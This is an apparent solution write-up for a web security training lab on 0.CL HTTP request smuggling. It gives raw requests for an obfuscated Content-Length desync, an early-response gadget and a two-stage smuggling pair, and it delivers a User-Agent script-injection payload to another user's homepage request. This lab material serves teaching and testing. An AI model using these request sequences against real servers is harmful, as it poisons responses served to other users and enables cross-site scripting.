# Solution — 0.CL request smuggling

Objective (Academy description page): *"This lab is vulnerable to 0.CL request
smuggling. Carlos visits the homepage every five seconds. To solve the lab,
exploit the vulnerability to execute alert() in his browser."*

All requests below are raw HTTP/1.1 over TLS (`openssl s_client`-style), because
`curl` will not let you send an obfuscated `Content-Length` or pipeline bodies.
Every `<LAB>` is the instance host.

## 1. Baseline

```
GET / HTTP/1.1
Host: <LAB>
Connection: close
```

Response header block contains `widget-container-lab-status is-notsolved`
(`<p>Not solved</p>`).

## 2. The XSS channel (control)

Every blog post page echoes the request's `User-Agent` into a hidden form input
without HTML-escaping it:

```
GET /post?postId=6 HTTP/1.1
Host: <LAB>
User-Agent: x"><script>alert(1)</script>
Connection: close
```

The body contains (verbatim, unescaped):

```html
<input required type="hidden" name="userAgent" value="x"><script>alert(1)</script>">
```

Self-XSS on its own — Carlos will never send that header. It becomes exploitable
once the smuggled request is what answers his `GET /`.

## 3. Prove the Hidden-Visible `Content-Length`

Obfuscate the header with a space before the colon. The front-end does not see
it (so it forwards the request immediately), the back-end does (so it waits for
a body):

```
POST / HTTP/1.1
Host: <LAB>
Content-Length : 20
```

No response arrives — the upstream connection is deadlocked. A normal
`Content-Length: 20` with no body would instead block on the client side; here
the request was already forwarded. This deadlock is the 0.CL signature.

Complete the hidden body from the same connection and the leftover bytes are
parsed as a pipelined request by the back-end:

```
GET /resources/images/blog.svg HTTP/1.1
Host: <LAB>
Content-Length : 20

GET / HTTP/1.1
X: yGET /wrtz HTTP/1.1
Host: <LAB>
```

The first 20 bytes of the second request (`GET / HTTP/1.1\r\nX: y`) are eaten as
the body; `GET /wrtz HTTP/1.1` is then parsed as a request and the front-end
answers `400 Bad Request` (or a 404 for the smuggled path, depending on how the
front-end re-serialises the header block). Either way the response is not the
one belonging to the request that was sent — the connection is desynced.

## 4. Early-response gadget

The deadlock must be broken by a path the back-end answers *before* the body
arrives, keeping the connection open:

```
GET /resources/css/anything HTTP/1.1
Host: <LAB>
Connection: close
```

```
HTTP/1.1 302 Found
Location: /resources/css/anything/
Content-Length: 0
```

Any non-existent name under `/resources/css/` (or `/resources/js/`) behaves the
same way; the solver probes the candidates and takes the first 3xx.

## 5. The double-desync pair

Stage 1 — deadlock and break it (note the hidden `Content-Length`, no body):

```
POST /resources/css/anything HTTP/1.1
Host: <LAB>
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length : 45
```

`45` is exactly `len(stage2_chopped)`.

Stage 2 — its header block is the 45 bytes the back-end is waiting for; the rest
is parsed as pipelined requests by the back-end, while the front-end still
believes it is the body of an `OPTIONS` request:

```
OPTIONS / HTTP/1.1
Content-Length: 160
X: YGET /404 HTTP/1.1
Host: <LAB>
User-Agent: foo
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

GET /post?postId=6 HTTP/1.1
Host: <LAB>
User-Agent: x"><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 5

x=1
```

(`Content-Length: 160` is `len(smuggled_request)`; the request line of the
smuggled request is glued onto the end of the `X` header value so the 45-byte
split lands exactly on it.)

Send stage 1 on one connection and stage 2 on another, repeatedly and
concurrently: the front-end pools upstream connections, so the smuggled
`/post?postId=6` request is produced on a shared connection and its 200 response
is served to the next request that lands there — including Carlos's `GET /`.

## 6. Confirm

`GET /` (or the `/academyLabHeader` WebSocket) shows
`widgetcontainer-lab-status is-solved` and `<p>Solved</p>`.

In-band proof that the smuggled page really is produced: on the tested instance
a persistent pipelined variant saw the post page (with
`value="x"><script>alert(1)</script>"`) come back as a response to the attacker's
own requests — `evidence/leaked-smuggled-page.html`.

## One command

```bash
uv run python solve.py --url "https://<lab-id>.web-security-academy.net/"
```
